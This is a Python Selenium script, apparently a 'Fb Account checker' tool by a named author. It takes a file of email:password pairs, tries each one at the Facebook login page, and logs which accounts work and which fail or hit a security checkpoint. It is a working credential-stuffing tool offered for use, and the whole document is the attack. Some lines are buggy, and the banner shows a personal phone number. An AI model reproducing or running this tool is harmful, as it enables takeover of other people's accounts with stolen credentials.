from selenium import webdriver
from time import sleep
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
######################
##############################
print('''
        ======================================
        ==        Fb Account checker        ==
        ==      Coded By Ahmed Mubarak      ==
        ==          +201145672039           ==
        ======================================
''' )
acc_list = input("set account list here ===> ")
done_list = open('accounts_done.txt', 'a')
check_list = open('account_error.txt', 'a')
email = ''
password = ''
file = open(acc_list , 'r')
for row in file:
     field = row.split(":")
     email = field[0]
     password = field[1]
     options = webdriver.ChromeOptions()
     prefs = {"profile.default_content_setting_values.notifications" : 2}
     options.add_argument("--incognito")
     #options.headless = True
     options.add_experimental_option("prefs", prefs)
     driver = webdriver.Chrome(chrome_options=options)
     driver.implicitly_wait(30)
     driver.get("https://www.facebook.com")
     email_box = driver.find_element_by_id('email')
     email_box.clear()
     email_box.send_keys(email)
     pass_box = driver.find_element_by_id('pass')
     pass_box.clear()
     pass_box.send_keys(password)
     driver.find_element_by_xpath('//label/input').click
     sleep(5)
     if '/login/device-based/regular/' in driver.current_url :
         check_list.write('[login error[!] check email or password! ]' +email + ':' + password)
         print('[ login error[!] check email or password! ] ' + email + ':' + password )
         check_list.closed
         driver.quit()
     elif 'checkpoint' in driver.current_url :
       check_list.write('[Account Check Point Error !!] ['+email + ':' + password+']\n')
       print('[ Account Check Point Error !! ] '+email + ':' + password)
       check_list.closed
       driver.quit()
     else:
       driver.quit()
       done_list = open('accounts_done.txt', 'a')
       print('[ Account Work successfully ! ] ' + email + ":" + password)
       done_list.write(email + ":" + password + ' [Account Done !!]\n')
       done_list.close()
print('/n''the list has been checked successfully enjoy :)')
print("Coded By Ahmed Mubarak")
